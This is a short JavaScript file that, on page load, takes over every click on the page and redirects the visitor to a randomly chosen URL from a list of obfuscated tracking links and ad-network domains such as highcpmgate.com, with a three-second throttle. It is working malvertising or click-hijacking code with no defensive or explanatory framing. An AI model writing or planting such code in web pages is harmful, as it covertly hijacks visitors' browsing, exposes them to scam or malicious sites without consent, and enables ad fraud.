function init() {
  var arr = [
    "https://altruisticemergency.com/b/3NV.0/PU3fppvHb-mRVpJDZWD/0n1FM_z/Ep0jOATPUM5ZL_TdUWzwMqTOQ/5YNRjvAw",
    "https://altruisticemergency.com/b.3/VS0-PN3XpevWbbmaVFJHZmDY0c1cM/Tzk/5/N/DWAk4OLtT/UZx/O/Tbk/0cMMDIku",
    "https://altruisticemergency.com/bU3JV.0rPb3Zp/v/b_mxV/JuZaDu0W1CMfTrkq5NNcDqAHwvLITdUwxOOsThkM0CMkDeEq",
    "https://altruisticemergency.com/b.3TV-0NPq3/p/vwbBmZVGJgZwDx0m1lM/j/U/yHN-jrUa2pLSTDUNydNyTTIi2/N/T/cP",
    "https://altruisticemergency.com/b/3/VY0.PJ3XppvmbymnVEJ/ZDDA0o1/M/T/kd5VMyzKgVyuLUT/UhxwOVTyknzLO/D_Mx",
    "https://altruisticemergency.com/b.3pVt0/Pu3/pYvgb_mvVRJiZeD/0A1oMazRMoznMOT/MY1XLoTSUezyMwzhM_xzM/z/YT",
    "https://altruisticemergency.com/bW3aVR0.Pg3Ip/vLbsmrVAJqZVDA0S1/MHzpMmx/N/jzEdzlLwTnUhzRMBzWEf2VMBTZQA",

    "https://zuhempih.com/4/7436813",
    "https://thoadsaibsou.net/4/7474716",
    "https://phuruxoods.com/4/7237907",
    // "https://bauptost.net/4/7420689",
    // "https://eptougry.net/4/7420696",
    // "https://lidsaich.net/4/7420698",

    'https://www.highcpmgate.com/gqz2615ye8?key=fa0feaae93d41f849f02500024a84fc8',
    'https://www.highcpmgate.com/z8767nw9bd?key=dd73fef32d545b5b5559b3dd496c33b8',
    'https://www.highcpmgate.com/dmm6uzza8y?key=ae8300ee01b398a137d6f63fcc00bd63',
    'https://www.highcpmgate.com/e6c1p52s2n?key=6b16c783c5b3542a115fb23958f8a755',
    'https://www.highcpmgate.com/egwhqfd5j4?key=a78fdce973ec5e6fdfe7a340cbe80330',
    'https://www.highcpmgate.com/pmy722dia8?key=43d6dbe10c1901c59565bb335437c63f',
    'https://www.highcpmgate.com/dt96vw75f?key=4c755e88f5de59ca53ef34992768986a',
  ];
 
  var didOpen = false;
  // 监听页面的点击事件
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 3000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();